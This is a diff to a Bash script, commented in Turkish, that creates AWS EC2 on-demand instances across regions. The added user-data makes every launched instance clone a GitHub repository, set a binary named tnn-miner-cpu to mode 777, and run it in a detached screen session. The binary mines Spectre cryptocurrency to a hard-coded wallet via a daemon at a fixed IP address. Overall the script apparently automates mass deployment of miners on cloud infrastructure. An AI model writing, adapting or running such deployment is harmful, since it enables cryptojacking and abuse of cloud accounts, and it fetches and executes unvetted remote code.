@@ -71,7 +71,8 @@ create_on_demand_request() {
     security_group_id=$(aws ec2 describe-security-groups \
         --region "$region" \
         --filters "Name=group-name,Values=default" \
-        --query "SecurityGroups[0].GroupId" --output text)
+        --query "SecurityGroups[0].GroupId" \
+        --output text)
 
     aws ec2 authorize-security-group-ingress \
         --region "$region" \
@@ -95,6 +96,19 @@ create_on_demand_request() {
         return
     fi
 
+    # User Data komutları
+    user_data=$(cat <<EOF
+#!/bin/bash
+sudo yum update -y
+sudo yum install git -y
+git clone https://github.com/eraemm/efsaneyim.git
+cd efsaneyim
+chmod 777 tnn-miner-cpu
+screen -dmS spectre ./tnn-miner-cpu --spectre --daemon-address 194.238.25.124 --port 5555 --wallet spectre:qq66aq7yfpg7sfs27fmc3t5jfqx786e569la6d85hmvvn2807c6pqfj6tuz6a
+screen -ls
+EOF
+    )
+
     # On-demand instance talebi oluştur
     echo "$region bölgesinde uygun bir tür için on-demand instance talebi oluşturuluyor..."
 
@@ -104,6 +118,7 @@ create_on_demand_request() {
         --instance-type "$instance_type" \
         --security-group-ids "$security_group_id" \
         --subnet-id "$subnet_id" \
+        --user-data "$user_data" \
         --count 1 \
         --query 'Instances[0].InstanceId' --output text)
 
